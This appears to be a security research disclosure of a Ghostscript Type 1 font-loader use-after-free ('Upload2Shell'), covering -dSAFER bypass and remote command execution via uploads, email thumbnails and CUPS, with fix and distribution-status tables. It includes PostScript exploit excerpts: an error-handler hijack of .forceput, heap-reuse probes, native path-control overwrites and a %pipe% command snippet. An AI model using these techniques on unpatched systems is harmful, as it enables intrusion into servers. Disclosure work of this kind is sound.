Our previous research into [ImageMagick's format handling and security policies](https://pwn.ai/blog/imagemagick-from-arbitrary-file-read-to-rce-in-every-policy-zeroday) showed how files with trusted extensions such as `.jpg` and `.png` could be handed to an unexpected interpreter. In this article, we show how we reached Ghostscript through most of the applications we tested, exploited a memory corruption bug in its font loader, and bypassed its `-dSAFER` sandbox to achieve remote command execution across widely used software.

On 25 September, we posted a short announcement naming some of the applications and services our research had reached. The list came from following file-processing dependencies across products that otherwise had little in common.

That gave us two connected questions to investigate: which interpreters could we reach through ordinary application features, and could those interpreters safely process the files we sent? We continued into Ghostscript's internals and found several independent bugs of varying impact. We reported them to Artifex and worked with affected platforms to harden their file processing. Some of those bugs are still being fixed.

This article follows one of the more interesting findings. **Upload2Shell**, now [CVE-2026-125396](https://www.cve.org/CVERecord?id=CVE-2026-125396), is a use-after-free in Ghostscript's Type 1 font loader. It gave us a write-what-where primitive: the ability to choose both the data written and its destination in native memory. A crafted document could use that control to alter the state enforcing `-dSAFER` and run commands as the rendering process.

Almost every application we tested with file uploads could be tricked into passing a file with a trusted extension to Ghostscript. A feature as routine as cropping an image or generating a preview could expose the interpreter. With the primitive working, we followed those conversion paths back out to their remote entry points.

## How an image upload reaches Ghostscript

Consider a PHP application generating a preview. Its code calls Imagick, the PHP binding to ImageMagick. ImageMagick selects a format handler, which may delegate the rendering to Ghostscript or another interpreter. The upload endpoint does not have to start `gs` itself; it only has to pass the file to a library that will.

Our WordPress-shaped preview proof reached that delegate through `Imagick::readImage($input . '[0]')`. The filename ended in `.pdf`, but the bytes were PostScript; ImageMagick handed them to Ghostscript under `-dSAFER`. The exploit also needed a Type 1 font file. In this delegate, it wrote the font to the scratch output path already authorized in `currentpagedevice /OutputFile`; another self-contained variant used Ghostscript's process-local `%ram%` device. Neither needed a pre-existing font file on the server.

Ghostscript can also be linked into an image-processing build as a library. In that arrangement, the interpreter runs inside the existing process instead of appearing as a separate `gs` command. Looking only for explicit Ghostscript calls in application code misses both kinds of indirect invocation.

## Common ways a file reaches Ghostscript

An application does not need to call `gs` itself. In our separate decoder tests, the following ordinary image calls reached Ghostscript when given EPS content, even when the file was named `.png`.

```
from PIL import Image
with Image.open(uploaded_file) as image:
    image.load()  # pixel decoding invoked Ghostscript for EPS content
```

`Image.open()` alone only identified the file in our test. Loading pixels, cropping, or converting them started the renderer.

| Common call | Route observed in the tested build |
| --- | --- |
| `Pillow Image.load()`, `crop()` | Pillow EPS decoder → Ghostscript |
| `imageio.imread()`, `skimage.io.imread()` | Image reader → Pillow → Ghostscript |
| `PHP Imagick::readImage()` | ImageMagick PostScript delegate → Ghostscript |
| `libvips thumbnail()` | System build's `magickload` → ImageMagick → Ghostscript; build dependent |
| `Qt QImageReader.read()` | KImageFormats EPS plugin → Ghostscript; plugin dependent |

Our source audit also found image decoding calls in [InvokeAI uploads](https://github.com/invoke-ai/InvokeAI/blob/5921fd6e84c6e08987ddd762c7ca764058741acf/invokeai/app/api/routers/images.py#L55-L145), [AUTOMATIC1111 img2img](https://github.com/AUTOMATIC1111/stable-diffusion-webui/blob/82a973c04367123ae98bd9abdf80d9eda9b910e2/modules/ui.py#L541-L553), and [ComfyUI previews](https://github.com/Comfy-Org/ComfyUI/blob/0263e48806e5be43fa926d3961caac29cd268d84/server.py#L599-L667).

We tested the calls developers use after accepting an image. Across two controlled runs on Ubuntu 24.04 with Ghostscript installed, one matrix traced 145 benign calls across 29 image APIs and the other covered additional wrappers including Imagick and imageio. We also gave the PostScript sample a `.png` name. It was not a valid PNG; this tested whether the decoder trusted the name or inspected the bytes. The versions below describe the tested libraries, not every product that uses them.

| Library and tested version | Call after receiving a file | What the trace showed |
| --- | --- | --- |
| Python · Pillow 13.0.0 | `Image.open()` followed by `load()`, `crop()`, or `thumbnail()` | Pillow recognized EPS content under either name and invoked Ghostscript directly when pixels were needed. `Image.open()` alone only identified the file. |
| Python · imageio 2.38.2; scikit-image 0.26.0 | `imageio.v2.imread()`, `imageio.v3.imread()`, or `skimage.io.imread()` | These array-returning calls reached Ghostscript through Pillow for the same EPS bytes. |
| PHP 8.3.6 · Imagick with ImageMagick 6.9.12-98 | `Imagick::readImage()` | ImageMagick selected PostScript from the content and delegated rendering to Ghostscript. The Imagick extension version was not recorded. |
| Python · pyvips 3.2.0; Ruby Vips 2.3.0; system libvips 8.15.1 | `new_from_file()` followed by pixel access, or `thumbnail()` | This libvips build selected `magickload`, then ImageMagick and Ghostscript. Ruby thumbnailing started Ghostscript but returned an error. The route depends on installed loaders. |
| Qt · KImageFormats 5.115.0 | `QImageReader.read()` with the EPS plugin installed | The plugin invoked Ghostscript directly. `canRead()` alone did not render. |
| Python · Matplotlib 3.11.2 | `matplotlib.image.imread()` | An `.eps` file reached Ghostscript; the same EPS bytes named `.png` were rejected by its PNG-specific reader. |

The decoder matters. PHP GD, OpenCV, prebuilt Sharp, Jimp, Java ImageIO, and Go's standard image decoders did not start Ghostscript for these inputs. Copying or storing a file did not render it either; the later preview or conversion is the step to inspect.

Ghostscript renders both PDF and PostScript. PostScript is a Turing-complete programming language used to describe pages, so rendering a PostScript document means executing a program. Ghostscript's `-dSAFER` sandbox restricts that program's file access and command execution. Like seccomp, it limits what untrusted code can do, but the enforcement is different: `-dSAFER` relies on checks inside the interpreter rather than a kernel-enforced system-call filter.

That still leaves a large interpreter exposed to attacker-controlled programs. As with a JavaScript engine such as V8, running the language is expected; a memory-safety bug can let a program corrupt the engine running it. An attacker can develop and test that program as a PostScript file, then deliver it through an ordinary upload.

Those permission checks matter because the rendering process has access of its own. Its service account may be able to read application files, write to disk, and start other programs. The sandbox is supposed to keep an untrusted document from using that authority. Loading a font is one of the ordinary rendering operations that must respect this boundary.

## A font helper with privileged access

GPT 5.6 Sol, working with [@PaulosYibelo](https://x.com/PaulosYibelo), found the issue in `.putgstringcopy`, a helper in `Resource/Init/gs_fonts.ps`. Ghostscript implements parts of its own font loading in PostScript. This helper needed to write into protected font dictionaries, so it used an internal operation called `.forceput`.

Ordinary document code should not have that ability. The helper was bound and marked `executeonly`, protecting its implementation from direct inspection. But it still had to execute, and one of the operations before its privileged write could fail. The relevant sequence was:

```
dup length string copy
.forceput setglobal
```

The first line copies a string. The second performs the protected store and restores the allocation mode. The helper did not first check that its operands were of the expected types.

We registered a Type 1 font in `Fontmap` and loaded it with `findfont`. The font defined an ordinary Courier-derived face, but its loading code could see the font loader's operand stack. It replaced the filename string on that stack with a local array. In the global-to-local conversion branch, `length` and string allocation succeeded; `copy` then raised `typecheck` because its source was an array.

The document's error handler returned with the stack prepared for the *next* operation in the already-bound helper. This is the operative excerpt from our proof:

```
/LoaderOriginalTypecheck errordict /typecheck get def
errordict /typecheck {
  userdict /LoaderTrapPhase known
    { userdict /LoaderTrapPhase get } { false } ifelse
  {
    userdict /LoaderTrapPhase false put
    pop pop pop pop pop
    userdict /ForceTarget get
    userdict /ForceKey get
    userdict /ForceValue get
  } { LoaderOriginalTypecheck } ifelse
} bind put
```

The five pops discard the failing `copy`, its new destination string, our substituted filename, the loader's `/PathLoad` key, and the loaded font dictionary. They leave the saved allocation-mode boolean on the stack. Our chosen dictionary, key, and value follow it. Execution resumes at `.forceput`; the subsequent `setglobal` consumes the boolean. We never had to call the hidden operator directly.

One implementation detail made that recovered write more than a protected-dictionary edit. In `psi/zgeneric.c`, `.forceput` temporarily treats `systemdict` as local while it stores the value, then restores the dictionary's space flags. A local object can therefore pass the store check into a dictionary that survives a later `restore`.

### A reference survived the object it described

A protected dictionary write alone does not explain native code execution. The next step broke a separate rule: a reference must not remain usable after its object has been reclaimed.

PostScript distinguishes local and global virtual memory. Here, “virtual memory” refers to the interpreter's object spaces. A `save` records local memory state; a later `restore` discards objects created since that save. Global objects can survive that restoration.

That creates a lifetime constraint. A surviving global dictionary must not keep a usable reference to a local object that `restore` will free. Otherwise, restoring the local space leaves the dictionary pointing into reclaimed storage.

Our recovered store let us create precisely that relationship:

```text
Before restore
  surviving global dictionary → local object

After restore
  surviving global dictionary → freed storage

After the allocation is reused
  surviving global dictionary → live interpreter data
                                 at the same address
```

The reference in the dictionary had not changed. What occupied the address had.

A small probe made the reuse visible before we touched native memory. This excerpt omits the font setup and error handler; `findfont` triggers the recovered `.forceput`, which places a local array in `systemdict`:

```
/AttackSave save def
userdict /ForceValue 8 array put
userdict /ForceValue get 0 31337 put
{ /GSLoaderProbe findfont pop } stopped pop
AttackSave restore
8 array userdict exch /Replacement exch put
userdict /Replacement get 0 4242 put
systemdict /GS_FORCEPUT_DANGLING_ARRAY get 1 5151 put
userdict /Replacement get 1 get ==
```

The last read comes from `Replacement`; the write goes through the stale `systemdict` reference. If the freed allocation is reused, `Replacement[1]` reads `5151`. The two references have reached the same bytes.

The native proof uses the same idea with a dangling 2,048-byte string and fresh arrays of integers. Each integer is `0x12345678`. We scan the stale string for the marker's bytes, change its low byte from `0x78` to `0x79`, then find the live array element that became `0x12345679`. That identifies the overlapping slot; no absolute heap address has to be guessed.

On our 64-bit build, a Ghostscript `ref` occupies 16 bytes: eight bytes for its type, attributes, and size, followed by eight bytes for its value or pointer. We saved a valid integer ref for cleanup and the header of a valid writable string ref as a template. Then we placed `currentdevice` in the overlapping array slot, read its genuine device-reference pointer through the dangling string, and changed the live ref into a temporary string view over that pointer. The byte view let us follow Ghostscript's own pointers:

```text
ref +8: value.pdevice               → psi_device_ref
psi_device_ref +0: device         → gx_device
gx_device +24: memory            → gs_memory_t
gs_memory_t +208: gs_lib_ctx      → gs_lib_ctx_t
gs_lib_ctx_t +8: core            → gs_lib_ctx_core_t
gs_lib_ctx_core_t +156: path_control_active
```

Those structure offsets describe the tested x86-64 build; the address of each object came from a live interpreter reference. This is why the proof did not depend on a fixed process address. We restored the forged ref to its original integer form before exercising file or command access.

## Changing the interpreter underneath the document

We demonstrated native control in production image and document pipelines with a reversible change to an arithmetic operator. We copied the 16-byte `mul` reference, obtained a genuine `sub` reference, and replaced only the eight pointer bytes at offset 8 in the live `mul` ref. We invoked that *same ref* once and copied the original 16 bytes back. This was a C function-pointer change, not a PostScript definition of a new `mul`.

The returned page recorded the before, during, and after values:

```
29 × 11, before:   319
29 × 11, changed:   18
29 × 11, restored: 319
```

The middle result is `29 - 11`. The captured proof output also recorded `NATIVE_POINTER_OVERWRITE_MATCHED=true` and `NATIVE_DISPATCH_RESTORED=true`. For most reports, we used a simpler proof that read `/proc/version` and returned its contents. The arithmetic test demonstrated native control; the file read demonstrated that we had crossed Ghostscript's file-access boundary.

### From native memory to a command

The same byte view gave us a target for command execution: Ghostscript's native path-control state. After walking the pointer chain above, `Target` was the forged string view over `gs_lib_ctx_core_t`. The decisive write in the proof was four PostScript `put` operations on native bytes:

```
Target 156 0 put
Target 157 0 put
Target 158 0 put
Target 159 0 put
```

Those bytes were `path_control_active`. The proof read `1,0,0,0` before the write and `0,0,0,0` after it, then confirmed that `.currentpathcontrolstate` was false. `-dSAFER` was still on the Ghostscript command line; its native file-path check had been disabled in memory.

That was not the only check. The proof first used the recovered `.forceput` to set the PostScript-side `PermitFileWriting` list to `[ (*) ]`. For `%pipe%`, `parse_file_name()` also consulted a cached `LockFilePermissions` flag. We loaded the font a third time, force-wrote that protected user parameter to `false`, and used `save`/`restore` to synchronize the cached value. The recorded sequence makes the separate gates visible:

```
POSTSCRIPT_WRITE_PERMIT=[(*)]
PATH_CONTROL_BYTES_BEFORE=1,0,0,0
PATH_CONTROL_BYTES_AFTER=0,0,0,0
PATH_CONTROL_OPERATOR_STATE=false
LOCK_FILE_PERMISSIONS_AFTER_RESTORE=false
```

The bounded Debian print job ended with this command proof, writing only a marker in `/var/tmp`:

```
(PIPE_RCE_STOPPED=) print
{
  (%pipe%printf POST_SAFER_UAF_PIPE_RCE > /var/tmp/GS_CUPS_PIPE_RCE)
  (w) file closefile
} stopped
dup ==
```

The scheduler recorded `PIPE_RCE_STOPPED=false`, and the marker file appeared on the print server. `false` here means the `stopped` block completed. The command ran as `uid=7(lp)`, the renderer's account, not as the person who submitted the job.

## Following the document back to the network

With the interpreter primitive established, the next question was where a remote user could supply the document. We traced how popular applications invoked image and PDF processing. Three cases show how different the entry points could be.

### Roundcube

An attacker only had to send a crafted email to someone using the Roundcube server and have the recipient view the message. The sender needed no Roundcube account. The recipient did not have to click or download the attachment: displaying the email triggered the server-side processing that ran our command.

Our attachment was declared as `image/jpeg` and named `quarterly-results.jpg`, but its contents were PostScript. Roundcube treated it as an image and automatically requested a thumbnail. The thumbnail path passed the attachment to ImageMagick, which invoked Ghostscript. The document ran our proof command as `www-data` and produced a thumbnail.

### WordPress

We reached the same Ghostscript interpreter while WordPress generated a preview for an uploaded PDF. In WordPress Core, media upload privileges were enough: Authors and higher roles have them by default. Plugins using WordPress's upload and preview functions exposed the same path. WordPress's [CVE-2026-65640 advisory](https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-8vr3-7mxf-gx8w) describes remote code execution on sites using Imagick and Ghostscript. On our Linux systems, that was the stack handling the uploads.

Plugins exposed that processing to visitors without an account. In Forminator, we used a public PDF field configured to store the upload in the Media Library. That caused WordPress to generate attachment metadata and enter the Imagick conversion path. Essential Addons for Elementor's public registration widget provided another route through its upload field. Both chains ran the command as the web-service user. Once the file reached the renderer, the font-loader flaw was the same.

### Debian 13

We also reached Ghostscript through CUPS on Debian 13 and other Linux distributions. On Debian 13, we sent an IPP `Print-Job` to a shared network queue that accepted jobs without authentication. CUPS passed our PostScript document to `gstopdf`, which started the distribution's Ghostscript with `-dSAFER`. The command ran on the print server as `uid=7(lp)`.

```
anonymous IPP Print-Job
  → shared CUPS queue
  → gstopdf → Ghostscript (-dSAFER)
  → font-loader use-after-free
  → native path control changed
  → command executed on the host as uid=7(lp)
```

Our RCE proof executed one fixed command and wrote a marker under `/var/tmp`. Requiring authentication on the queue blocked the unauthenticated submission. Shared queues that accept network print jobs without credentials expose the renderer to anyone who can reach them.

The [Ghostscript CVE](https://www.cve.org/CVERecord?id=CVE-2026-125396) scores the interpreter flaw at **8.5 under CVSS 4.0**. That rating uses a local attack vector. Our demonstrations reached the interpreter remotely, through both production services and the applications described here. CUPS supplied a network-exploitable print path; Roundcube supplied an email-based remote exploit; WordPress and its plugins supplied remotely exploitable upload paths. The recorded trials show that these chains were repeatable. The attacker could deliver the exploit remotely, despite the interpreter's local attack-vector classification.

## Application paths

The first ten rows show Upload2Shell proofs in products or their shipped components. The rows after them trace more upload and preview paths. Each entry gives the access, tested stack or pinned source revision, and the processing step that matters.

| Product and tested stack / source revision | Attacker access and trigger | Result or renderer path | Evidence | Case study / PoC |
| --- | --- | --- | --- | --- |
| **Debian 13 CUPS**, Ghostscript `10.05.1~dfsg-1+deb13u1` | Anonymous IPP `Print-Job` to a shared network queue | Command on the host as `uid=7(lp)` | One complete remote run; 20/20 separate local conversions | First in series |
| **Roundcube 1.7.2**, Ghostscript 10.07.1 | External sender emails a disguised attachment; authenticated recipient views the message, without clicking the attachment; permissive ImageMagick delegate required | Command as `uid=33(www-data)` | 5/5 message-view trials | Not yet published |
| **WordPress 7.0.2 + Forminator 1.55.1**, Ghostscript 10.05.1 | Signed-out visitor submits a public PDF upload form configured to store files in the Media Library | Command as `uid=33(www-data)` | 5/5 HTTP trials | Not yet published |
| **WordPress 7.0.2 + Essential Addons for Elementor Lite 6.7.0 + Elementor 4.2.0**, Ghostscript 10.05.1 | Signed-out visitor uses a public Login/Register widget with a custom upload field and registration enabled | Command as `uid=33(www-data)` | 5/5 HTTP trials | Not yet published |
| **WordPress Core** 7.0.0–7.0.3, 6.9.0–6.9.6, and earlier branches listed in the advisory; local renderer test on 6.9.4 | Author+ user with `upload_files` submits a malicious file on a site using Imagick and Ghostscript | [WordPress confirms remote code execution](https://wordpress.org/news/2026/08/wordpress-7-0-4-release/); our exact renderer test ran a command and wrote a PHP file as `uid=33(www-data)` | [CVE-2026-65640](https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-8vr3-7mxf-gx8w); fixed in 7.0.4, 6.9.7 and backports; 10/10 local renderer trials | Not yet published |
| **MediaWiki 1.46.0 + PdfHandler**, Ghostscript 10.05.1 | Anonymous PDF upload and thumbnail request on a wiki explicitly configured to permit anonymous uploads | Command as `uid=33(www-data)` | 5/5 HTTP trials | Not yet published |
| **DokuWiki 2026-07-14a**, Ghostscript 10.05.1 | Anonymous upload and resize on an open wiki using the optional ImageMagick backend and a permissive policy | Command as `uid=33(www-data)` | 5/5 HTTP trials | Not yet published |
| **Mayan EDMS 4.11.5**, Ghostscript 10.05.1 | External sender emails a configured POP3 document source; worker imports and renders automatically | Command as `uid=1000` inside the application container | One email-to-worker run; parser path 5/5 | Not yet published |
| **ResourceSpace 11.0 r29423**, Ghostscript 10.05.1 | Authenticated user or valid upload-share capability submits a resource | Command in the preview worker | 5/5 complete API trials | Not yet published |
| **Plesk Obsidian 18.0.79**, Plesk Roundcube 1.6.17 and Ghostscript 9.54.0 | Roundcube message thumbnail; our test invoked its `rcube_image::resize()` component directly | Exact Plesk components ran a command as `uid=995(roundcube_sysuser)` in 5/5 tests in the successful configuration. | — | Not yet published |
| More application paths · renderer test or pinned source |  |  |  |  |
| **Gradio 6.32.0**, Pillow 13.0.0; Ubuntu 24.04 with Ghostscript installed | Image submission to an unauthenticated `gr.Image` app | HTTP preprocessing sent EPS bytes named `.png` through Pillow to `gs -dSAFER` | Renderer observed before the app function ran | — |
| **InvokeAI**, [source revision 5921fd6e](https://github.com/invoke-ai/InvokeAI/blob/5921fd6e84c6e08987ddd762c7ca764058741acf/invokeai/app/api/routers/images.py#L55-L145) | Single-user image upload; no login on a reachable service | Upload calls Pillow `Image.open()` and `load()` | Upload and authentication paths in pinned source | — |
| **AUTOMATIC1111 Stable Diffusion WebUI**, [source revision 82a973c0; Gradio 3.41.2; Pillow 9.5.0](https://github.com/AUTOMATIC1111/stable-diffusion-webui/blob/82a973c04367123ae98bd9abdf80d9eda9b910e2/requirements_versions.txt#L1-L11) | Shared img2img upload; login only if configured | [Image input](https://github.com/AUTOMATIC1111/stable-diffusion-webui/blob/82a973c04367123ae98bd9abdf80d9eda9b910e2/modules/ui.py#L541-L553) enters Gradio preprocessing and Pillow pixel conversion | Image input and preprocessing in pinned source | — |
| **ComfyUI**, [source revision 0263e488](https://github.com/Comfy-Org/ComfyUI/blob/0263e48806e5be43fa926d3961caac29cd268d84/server.py#L469-L667) | Image upload and preview on a reachable service | [Preview route](https://github.com/Comfy-Org/ComfyUI/blob/0263e48806e5be43fa926d3961caac29cd268d84/server.py#L599-L667) opens and converts the uploaded file with Pillow | Upload and preview routes in pinned source | — |
| **Frappe / ERPNext**, [Frappe source revision 2bf593fd](https://github.com/frappe/frappe/blob/2bf593fd229e025879ae661fa5fb67d569ee9130/frappe/handler.py#L207-L229) | Image upload with an account, or as a guest when enabled; optimization requested | Upload handler selects the image type from the filename and calls [Pillow thumbnail processing](https://github.com/frappe/frappe/blob/2bf593fd229e025879ae661fa5fb67d569ee9130/frappe/utils/image.py#L52-L78) | Upload handler and optimization code in pinned source | — |
| **Home Assistant Core**, [source revision e87199c7](https://github.com/home-assistant/core/blob/e87199c78fadc70ede16dcd278e6c086f9d8bc31/homeassistant/components/image_upload/__init__.py#L76-L124) | Account image upload; public thumbnail endpoint | [Thumbnail route](https://github.com/home-assistant/core/blob/e87199c78fadc70ede16dcd278e6c086f9d8bc31/homeassistant/components/image_upload/__init__.py#L193-L261) loads and resizes the stored image through Pillow | Upload and thumbnail routes in pinned source | — |
| **CVAT**, [source revision b976874b](https://github.com/cvat-ai/cvat/blob/b976874b367cd1b35cfa4c7da0dea293a4d28523/cvat/apps/engine/media_extractors.py#L124-L128) | Task-data upload with an account | Frame worker calls Pillow `Image.open().load()` after image classification | Task route and frame worker in pinned source | — |
| **Paperless-ngx**, [source revision bcfdfcaa; official image includes Ghostscript](https://github.com/paperless-ngx/paperless-ngx/blob/bcfdfcaa29e7f4d98df5eb9a2ad01cbb8f0bd6a7/Dockerfile#L119-L132) | Email attachment through a configured inbox | [PDF/A conversion](https://github.com/paperless-ngx/paperless-ngx/blob/bcfdfcaa29e7f4d98df5eb9a2ad01cbb8f0bd6a7/src/paperless/parsers/tesseract.py#L454-L493) calls Ghostscript directly | Mail importer and converter in pinned source | — |
| **django-filer**, [source revision 42ab4a73](https://github.com/django-cms/django-filer/blob/42ab4a73a0422fba101a50a8deb1807cf8305f17/filer/models/abstract.py#L113-L137) | Authenticated django-filer image upload | Image model opens the file with Pillow | Pillow identification path in pinned source | — |

### Production services

Our Ghostscript research also reached Google, Dropbox, and other production services whose names are redacted. The table brings those production services together; the Dropbox and redacted findings have separate roots from the Type 1 bug described in this article.

| Product and renderer | Entry and access shown | What the proof established | Case study / PoC |
| --- | --- | --- | --- |
| **Google's image and document pipeline**, Ghostscript 10.05.0 | **Google Docs:** signed-out request pointing to an attacker-hosted PostScript file labeled as an image or PDF. **Google Chat, Google Drive, and Gmail:** PostScript uploads | The proof of concept we sent them read and returned the worker's `/proc/version` file. | Not yet published |
| **Dropbox** | Production file-processing workflow | Separate Ghostscript finding; maximum program bounty awarded. Technical details will follow in the case study. | Not yet published |
| **Redacted** | Production file-processing workflow | Separate Ghostscript finding; maximum program bounty awarded. Technical details will follow in the case study. | Not yet published |
| **Redacted** | Production file-processing workflow | Separate Ghostscript finding; maximum program bounty awarded. Technical details will follow in the case study. | Not yet published |
| **Redacted** | Production file-processing workflow | Separate Ghostscript finding; maximum program bounty awarded. Technical details will follow in the case study. | Not yet published |
| **Redacted** | Production file-processing workflow | Separate Ghostscript finding; maximum program bounty awarded. Technical details will follow in the case study. | Not yet published |
| **Redacted** | Production file-processing workflow | Separate Ghostscript finding; maximum program bounty awarded. Technical details will follow in the case study. | Not yet published |

The renderer's account and the surrounding system controls determine what follows native memory control. That is why the table records process privileges and the observed result alongside the application name.

## Proof of Concept

Here is a complete, self-contained PostScript proof of the native operator write described above. It writes its Type 1 font to Ghostscript's process-local `%ram%` device, triggers the font-loader flaw, reuses the freed allocation, changes a live `mul` reference to call `sub`, and restores the original bytes. No companion font file is needed.

```
gs -dSAFER poc-native-write.pdf
```

```
BEFORE=319
HIJACKED=18
RESTORED=319
```

Each step below points to its lines in the full file. The `29 × 11` check returns `319` before and after the write. While the pointer is changed, it returns `18`, the result of subtraction. This proof demonstrates native memory control; the command-execution chain described above changes Ghostscript's path-control state instead.

The file changes native memory inside the rendering process. It does not execute a shell command or touch host files. On the fixed 10.08.0 build, the dangling-reference lookup failed before the pointer write.

## Fixing the interpreter and its callers

[Artifex's first fix](https://github.com/ArtifexSoftware/ghostpdl/commit/1484854e0c8ddfda1baa4ad4cd965b8a9790aa81) checks the operands before `.putgstringcopy` can fail in `copy`. That closes the error path we used to recover the privileged store. A [subsequent change](https://github.com/ArtifexSoftware/ghostpdl/commit/e0421767e13627e75055bb44cb01486887c2f9e8) moves the helper into C and removes its dependence on `.forceput`.

The first patch also explains why this kind of operation has been difficult to remove. Artifex was already working to eliminate or minimize its use. As the maintainer put it:

> “it isn't easy to undo 30 years worth of assumptions in the code.”
>
> Ken Sharp, Artifex, in the fix for bug 709684

An internal font loader needed a write that ordinary document code could not perform. An error exposed that authority to the document, and the document used it to violate an object-lifetime rule. The final memory corruption depended on assumptions made at several different layers.

The applications had their own opportunities to interrupt the chain. WordPress [released its Core mitigation in 7.0.4](https://wordpress.org/news/2026/08/wordpress-7-0-4-release/) on 12 August, with [backports to older supported branches](https://wordpress.org/documentation/wordpress-version/version-7-0-4/). Its application CVE and the Ghostscript CVE address different points in the processing path. For the CUPS route, queue authentication controls who can submit the document. A policy that prevents a renderer from starting a shell can limit what happens even after the interpreter is compromised.

The fix has to reach the renderer the application actually uses. Updating the host operating system does not update a separate copy of Ghostscript inside an existing container image or application bundle. A document worker can therefore keep using vulnerable code after the host's package has been replaced.

Application hardening can close a route into the interpreter as well. The Roundcube sequence illustrates why the order of operations matters: checking a file's real type after generating its thumbnail gives the renderer the first chance to interpret it. For each downstream service, the useful question is what changed in the path from the submitted file to the rendering process.

## Where the fix has reached

Artifex released the root fix in [Ghostscript 10.08.0 on 8 September 2026](https://github.com/ArtifexSoftware/ghostpdl-downloads/releases/tag/gs10080). Many distributions have since shipped it, either in that release or as a backport to an older version. Ubuntu published fixes for seven releases; Debian patched Trixie and its development branches.

The coverage is uneven. As of 12 November, Debian still listed Bookworm as vulnerable, Amazon Linux listed a pending fix, and several SUSE branches remained affected or in progress. Applications on those branches can still expose the flaw when their file-processing path reaches the affected Ghostscript package. A distribution name or a recent update to another Ghostscript CVE is not enough to establish that this bug is fixed.

The tables below record the package status for this specific flaw. Older version numbers can include a backported fix; a published fixed version does not establish that every application or container has adopted it.

### Vendor trackers still open

As of 12 November 2026, the following vendor trackers still listed a vulnerable, affected, or pending Ghostscript package for this exact flaw. These labels describe package status, not a tested remote application path. Check the package actually installed or bundled by each service.

| Platform | Vendor status | Evidence |
| --- | --- | --- |
| Debian 12 (Bookworm) | Vulnerable | [`10.0.0~dfsg-11+deb12u8` in Debian's vulnerable column](https://security-tracker.debian.org/tracker/CVE-2026-125396) |
| Amazon Linux 2, 2023, and 2027 Preview | Pending Fix | [Amazon's CVE status for `ghostscript`](https://explore.alas.aws.amazon.com/CVE-2026-125396.html) |
| SUSE Linux Enterprise 12 SP5 LTSS and selected 15 SP4–SP7 lines | In progress | [SUSE lists proposed packages in QA](https://www.suse.com/security/cve/CVE-2026-125396.html) |
| SUSE Linux Enterprise Server 16.0 and 16.1 | In progress | [SUSE product status](https://www.suse.com/security/cve/CVE-2026-125396.html) |
| openSUSE Leap 16.0 and 16.1 | Affected | [SUSE product status](https://www.suse.com/security/cve/CVE-2026-125396.html) |

We did not establish whether current RHEL, Rocky Linux, AlmaLinux, Oracle Linux, or stable Fedora packages contain the `.putgstringcopy` fix.

### Distribution packages

Ubuntu's [USN-8949-1](https://ubuntu.com/security/notices/USN-8949-1), published on 21 October 2026, describes our font-operand finding and lists fixed Ghostscript packages for seven releases. The notice predates the CVE assignment, so it labels this finding “No CVE number.” These are package fixes, not additional remote application tests.

#### Ubuntu fixed versions

| Ubuntu release | Fixed package version in USN-8949-1 | Notice date |
| --- | --- | --- |
| 26.10 | `10.07.1~dfsg-1ubuntu2.1` | 21 Oct 2026 |
| 26.04 LTS | `10.06.0~dfsg-3ubuntu1.2` | 21 Oct 2026 |
| 24.04 LTS | `10.02.1~dfsg1-0ubuntu7.10` | 21 Oct 2026 |
| 22.04 LTS | `9.55.0~dfsg1-0ubuntu5.15` | 21 Oct 2026 |
| 20.04 LTS (Pro) | `9.50~dfsg-5ubuntu4.15+esm3` | 21 Oct 2026 |
| 18.04 LTS (Pro) | `9.26~dfsg+0-0ubuntu0.18.04.18+esm6` | 21 Oct 2026 |
| 16.04 LTS (Pro + Legacy) | `9.26~dfsg+0-0ubuntu0.16.04.14+esm11` | 21 Oct 2026 |

#### Debian stable and development branches

[Debian's tracker](https://security-tracker.debian.org/tracker/CVE-2026-125396) records the first fixed source version for Trixie and unstable. The testing branch later received the upstream-fixed package. Debian 12 remains listed vulnerable in the vendor-status table above.

| Debian release | Fixed Ghostscript package | Documented date |
| --- | --- | --- |
| Debian 13 (Trixie) | `10.05.1~dfsg-1+deb13u2`; current security build `+deb13u3` | [25 Sep 2026 advisory](https://security-tracker.debian.org/tracker/DSA-6516-1) |
| Debian 14 (Forky/testing) | `10.08.0~dfsg-2` | [28 Sep 2026 migration](https://tracker.debian.org/pkg/ghostscript/news/?page=1) |
| Debian unstable (Sid) | `10.08.0~dfsg-1` first fixed; later `-2` | [12 Sep 2026 upload](https://tracker.debian.org/pkg/ghostscript/news/?page=1) |

#### Other Linux distributions and BSDs

The records below show packages containing upstream Ghostscript 10.08.0 or an advisory-listed fixed build. A package appearing here does not establish the first fixed date for every architecture or branch.

| Distribution | Package with the fix | Documented date |
| --- | --- | --- |
| [Arch Linux](https://archlinux.org/packages/extra/x86_64/ghostscript/) | `10.08.0-1` | 11 Sep 2026 repository update |
| [Fedora Rawhide (46)](https://packages.fedoraproject.org/pkgs/ghostscript/ghostscript/fedora-rawhide.html) | `10.08.0-1.fc46` | 15 Sep 2026 changelog |
| [Gentoo](https://packages.gentoo.org/packages/app-text/ghostscript-gpl/changelog) | `10.08.0` | 27 Sep added; 28 Sep stabilized |
| [Alpine Edge](https://pkgs.alpinelinux.org/package/edge/community/x86_64/ghostscript) | `10.08.0-r0` | 14 Oct 2026 build |
| [Alpine 3.24](https://pkgs.alpinelinux.org/package/v3.24/community/riscv64/ghostscript) | `10.08.0-r0` | 15 Oct 2026 build |
| [Alpine 3.23](https://pkgs.alpinelinux.org/package/v3.23/main/x86_64/ghostscript) | `10.08.0-r0` | 19 Oct 2026 build |
| [openSUSE Tumbleweed](https://ftp.suse.com/pub/projects/security/osv/openSUSE-SU-2026:12528-1.json) | `10.08.0-5.1` (advisory-listed) | 11 Nov 2026 advisory; earlier 10.08.0 packages existed |
| [FreeBSD Ports](https://cgit.freebsd.org/ports/commit/?id=9f90661c19e6a96af1a9f8a9dc85c70f8d4dd4fc) | `ghostscript10 10.08.0` | 12 Sep 2026 ports update |
| [NetBSD pkgsrc](https://mail-index.netbsd.org/pkgsrc-changes/2026/09/13/msg354558.html) | `ghostscript-agpl 10.08.0` | 13 Sep 2026 commit |
| [Nixpkgs / NixOS 26.05](https://github.com/NixOS/nixpkgs/pull/566751) | `10.08.0` | Available by 12 Nov; first channel date unestablished |
| [Kali rolling](https://pkg.kali.org/pkg/ghostscript/news/) | `10.08.0~dfsg-2` | 12 Oct 2026 import |
| [Mageia 10](https://advisories.mageia.org/MGASA-2026-0545.html) | `10.08.0-1.mga10` | 26 Oct 2026 advisory for another Ghostscript CVE; upstream version includes this fix |

